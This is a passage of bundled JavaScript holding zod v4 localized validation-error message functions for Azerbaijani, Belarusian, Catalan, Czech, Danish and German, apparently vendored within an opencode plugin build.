    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${issue3.expected}, daxil olan ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${stringifyPrimitive2(issue3.values[0])}`;
        return `Yanl\u0131\u015F se\xE7im: a\u015Fa\u011F\u0131dak\u0131lardan biri olmal\u0131d\u0131r: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue3.origin ?? "d\u0259y\u0259r"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element"}`;
        return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue3.origin ?? "d\u0259y\u0259r"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.prefix}" il\u0259 ba\u015Flamal\u0131d\u0131r`;
        if (_issue.format === "ends_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.suffix}" il\u0259 bitm\u0259lidir`;
        if (_issue.format === "includes")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.includes}" daxil olmal\u0131d\u0131r`;
        if (_issue.format === "regex")
          return `Yanl\u0131\u015F m\u0259tn: ${_issue.pattern} \u015Fablonuna uy\u011Fun olmal\u0131d\u0131r`;
        return `Yanl\u0131\u015F ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Yanl\u0131\u015F \u0259d\u0259d: ${issue3.divisor} il\u0259 b\xF6l\xFCn\u0259 bil\u0259n olmal\u0131d\u0131r`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan a\xE7ar${issue3.keys.length > 1 ? "lar" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} daxilind\u0259 yanl\u0131\u015F a\xE7ar`;
      case "invalid_union":
        return "Yanl\u0131\u015F d\u0259y\u0259r";
      case "invalid_element":
        return `${issue3.origin} daxilind\u0259 yanl\u0131\u015F d\u0259y\u0259r`;
      default:
        return `Yanl\u0131\u015F d\u0259y\u0259r`;
    }
  };
};
function az_default2() {
  return {
    localeError: error49()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/be.js
function getBelarusianPlural2(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error50 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0456\u043C\u0432\u0430\u043B",
        few: "\u0441\u0456\u043C\u0432\u0430\u043B\u044B",
        many: "\u0441\u0456\u043C\u0432\u0430\u043B\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u044B",
        many: "\u0431\u0430\u0439\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u043B\u0456\u043A";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0456\u045E";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0443\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0430\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0456 \u0447\u0430\u0441",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0447\u0430\u0441",
    duration: "ISO \u043F\u0440\u0430\u0446\u044F\u0433\u043B\u0430\u0441\u0446\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0430\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0430\u0441",
    cidrv4: "IPv4 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64",
    base64url: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64url",
    json_string: "JSON \u0440\u0430\u0434\u043E\u043A",
    e164: "\u043D\u0443\u043C\u0430\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0443\u0432\u043E\u0434"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F ${issue3.expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0432\u0430\u0440\u044B\u044F\u043D\u0442: \u0447\u0430\u043A\u0430\u045E\u0441\u044F \u0430\u0434\u0437\u0456\u043D \u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const maxValue = Number(issue3.maximum);
          const unit = getBelarusianPlural2(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue3.maximum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const minValue = Number(issue3.minimum);
          const unit = getBelarusianPlural2(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue3.minimum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u043F\u0430\u0447\u044B\u043D\u0430\u0446\u0446\u0430 \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u0430\u043A\u0430\u043D\u0447\u0432\u0430\u0446\u0446\u0430 \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u043C\u044F\u0448\u0447\u0430\u0446\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0430\u0434\u043F\u0430\u0432\u044F\u0434\u0430\u0446\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043B\u0456\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0431\u044B\u0446\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u0430\u0437\u043D\u0430\u043D\u044B ${issue3.keys.length > 1 ? "\u043A\u043B\u044E\u0447\u044B" : "\u043A\u043B\u044E\u0447"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043A\u043B\u044E\u0447 \u0443 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434";
      case "invalid_element":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u0430\u0435 \u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435 \u045E ${issue3.origin}`;
      default:
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434`;
    }
  };
};
function be_default2() {
  return {
    localeError: error50()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ca.js
var error51 = () => {
  const Sizable = {
    string: { unit: "car\xE0cters", verb: "contenir" },
    file: { unit: "bytes", verb: "contenir" },
    array: { unit: "elements", verb: "contenir" },
    set: { unit: "elements", verb: "contenir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entrada",
    email: "adre\xE7a electr\xF2nica",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "durada ISO",
    ipv4: "adre\xE7a IPv4",
    ipv6: "adre\xE7a IPv6",
    cidrv4: "rang IPv4",
    cidrv6: "rang IPv6",
    base64: "cadena codificada en base64",
    base64url: "cadena codificada en base64url",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Tipus inv\xE0lid: s'esperava ${issue3.expected}, s'ha rebut ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Valor inv\xE0lid: s'esperava ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opci\xF3 inv\xE0lida: s'esperava una de ${joinValues2(issue3.values, " o ")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "com a m\xE0xim" : "menys de";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Massa gran: s'esperava que ${issue3.origin ?? "el valor"} contingu\xE9s ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Massa gran: s'esperava que ${issue3.origin ?? "el valor"} fos ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "com a m\xEDnim" : "m\xE9s de";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Massa petit: s'esperava que ${issue3.origin} contingu\xE9s ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Massa petit: s'esperava que ${issue3.origin} fos ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Format inv\xE0lid: ha de comen\xE7ar amb "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Format inv\xE0lid: ha d'acabar amb "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Format inv\xE0lid: ha d'incloure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Format inv\xE0lid: ha de coincidir amb el patr\xF3 ${_issue.pattern}`;
        return `Format inv\xE0lid per a ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE0lid: ha de ser m\xFAltiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Clau${issue3.keys.length > 1 ? "s" : ""} no reconeguda${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Clau inv\xE0lida a ${issue3.origin}`;
      case "invalid_union":
        return "Entrada inv\xE0lida";
      case "invalid_element":
        return `Element inv\xE0lid a ${issue3.origin}`;
      default:
        return `Entrada inv\xE0lida`;
    }
  };
};
function ca_default2() {
  return {
    localeError: error51()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/cs.js
var error52 = () => {
  const Sizable = {
    string: { unit: "znak\u016F", verb: "m\xEDt" },
    file: { unit: "bajt\u016F", verb: "m\xEDt" },
    array: { unit: "prvk\u016F", verb: "m\xEDt" },
    set: { unit: "prvk\u016F", verb: "m\xEDt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u010D\xEDslo";
      }
      case "string": {
        return "\u0159et\u011Bzec";
      }
      case "boolean": {
        return "boolean";
      }
      case "bigint": {
        return "bigint";
      }
      case "function": {
        return "funkce";
      }
      case "symbol": {
        return "symbol";
      }
      case "undefined": {
        return "undefined";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "pole";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "regul\xE1rn\xED v\xFDraz",
    email: "e-mailov\xE1 adresa",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "datum a \u010Das ve form\xE1tu ISO",
    date: "datum ve form\xE1tu ISO",
    time: "\u010Das ve form\xE1tu ISO",
    duration: "doba trv\xE1n\xED ISO",
    ipv4: "IPv4 adresa",
    ipv6: "IPv6 adresa",
    cidrv4: "rozsah IPv4",
    cidrv6: "rozsah IPv6",
    base64: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64",
    base64url: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64url",
    json_string: "\u0159et\u011Bzec ve form\xE1tu JSON",
    e164: "\u010D\xEDslo E.164",
    jwt: "JWT",
    template_literal: "vstup"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${issue3.expected}, obdr\u017Eeno ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${stringifyPrimitive2(issue3.values[0])}`;
        return `Neplatn\xE1 mo\u017Enost: o\u010Dek\xE1v\xE1na jedna z hodnot ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue3.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue3.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue3.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue3.minimum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue3.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED za\u010D\xEDnat na "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED kon\u010Dit na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED obsahovat "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED odpov\xEDdat vzoru ${_issue.pattern}`;
        return `Neplatn\xFD form\xE1t ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Neplatn\xE9 \u010D\xEDslo: mus\xED b\xFDt n\xE1sobkem ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nezn\xE1m\xE9 kl\xED\u010De: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Neplatn\xFD kl\xED\u010D v ${issue3.origin}`;
      case "invalid_union":
        return "Neplatn\xFD vstup";
      case "invalid_element":
        return `Neplatn\xE1 hodnota v ${issue3.origin}`;
      default:
        return `Neplatn\xFD vstup`;
    }
  };
};
function cs_default2() {
  return {
    localeError: error52()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/da.js
var error53 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "havde" },
    file: { unit: "bytes", verb: "havde" },
    array: { unit: "elementer", verb: "indeholdt" },
    set: { unit: "elementer", verb: "indeholdt" }
  };
  const TypeNames = {
    string: "streng",
    number: "tal",
    boolean: "boolean",
    array: "liste",
    object: "objekt",
    set: "s\xE6t",
    file: "fil"
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  function getTypeName(type) {
    return TypeNames[type] ?? type;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "tal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "liste";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
        return "objekt";
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "e-mailadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkesl\xE6t",
    date: "ISO-dato",
    time: "ISO-klokkesl\xE6t",
    duration: "ISO-varighed",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodet streng",
    base64url: "base64url-kodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ugyldigt input: forventede ${getTypeName(issue3.expected)}, fik ${getTypeName(parsedType2(issue3.input))}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ugyldig v\xE6rdi: forventede ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ugyldigt valg: forventede en af f\xF8lgende ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing)
          return `For stor: forventede ${origin ?? "value"} ${sizing.verb} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor: forventede ${origin ?? "value"} havde ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing) {
          return `For lille: forventede ${origin} ${sizing.verb} ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `For lille: forventede ${origin} havde ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: skal starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: skal ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: skal indeholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: skal matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ugyldigt tal: skal v\xE6re deleligt med ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ukendte n\xF8gler" : "Ukendt n\xF8gle"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8gle i ${issue3.origin}`;
      case "invalid_union":
        return "Ugyldigt input: matcher ingen af de tilladte typer";
      case "invalid_element":
        return `Ugyldig v\xE6rdi i ${issue3.origin}`;
      default:
        return `Ugyldigt input`;
    }
  };
};
function da_default2() {
  return {
    localeError: error53()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/de.js
var error54 = () => {
  const Sizable = {
    string: { unit: "Zeichen", verb: "zu haben" },
    file: { unit: "Bytes", verb: "zu haben" },
    array: { unit: "Elemente", verb: "zu haben" },
    set: { unit: "Elemente", verb: "zu haben" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "Zahl";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "Array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "Eingabe",
    email: "E-Mail-Adresse",
    url: "URL",
    emoji: "Emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-Datum und -Uhrzeit",
    date: "ISO-Datum",
    time: "ISO-Uhrzeit",
    duration: "ISO-Dauer",
    ipv4: "IPv4-Adresse",
    ipv6: "IPv6-Adresse",
    cidrv4: "IPv4-Bereich",
    cidrv6: "IPv6-Bereich",
    base64: "Base64-codierter String",
    base64url: "Base64-URL-codierter String",
    json_string: "JSON-String",
    e164: "E.164-Nummer",
    jwt: "JWT",
    template_literal: "Eingabe"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ung\xFCltige Eingabe: erwartet ${issue3.expected}, erhalten ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ung\xFCltige Eingabe: erwartet ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ung\xFCltige Option: erwartet eine von ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Zu gro\xDF: erwartet, dass ${issue3.origin ?? "Wert"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "Elemente"} hat`;
        return `Zu gro\xDF: erwartet, dass ${issue3.origin ?? "Wert"} ${adj}${issue3.maximum.toString()} ist`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Zu klein: erwartet, dass ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} hat`;
        }
        return `Zu klein: erwartet, dass ${issue3.origin} ${adj}${issue3.minimum.toString()} ist`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ung\xFCltiger String: muss mit "${_issue.prefix}" beginnen`;
        if (_issue.format === "ends_with")
          return `Ung\xFCltiger String: muss mit "${_issue.suffix}" enden`;
        if (_issue.format === "includes")
          return `Ung\xFCltiger String: muss "${_issue.includes}" enthalten`;
        if (_issue.format === "regex")
          return `Ung\xFCltiger String: muss dem Muster ${_issue.pattern} entsprechen`;
        return `Ung\xFCltig: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ung\xFCltige Zahl: muss ein Vielfaches von ${issue3.divisor} sein`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Unbekannte Schl\xFCssel" : "Unbekannter Schl\xFCssel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ung\xFCltiger Schl\xFCssel in ${issue3.origin}`;
      case "invalid_union":
        return "Ung\xFCltige Eingabe";
      case "invalid_element":
        return `Ung\xFCltiger Wert in ${issue3.origin}`;
      default:
        return `Ung\xFCltige Eingabe`;
    }
  };
};
function de_default2() {
  return {
    localeError: error54()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/en.js
var parsedType2 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "number";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error55 = () => {
  const Sizable = {
    string: { unit: "characters", verb: "to have" },
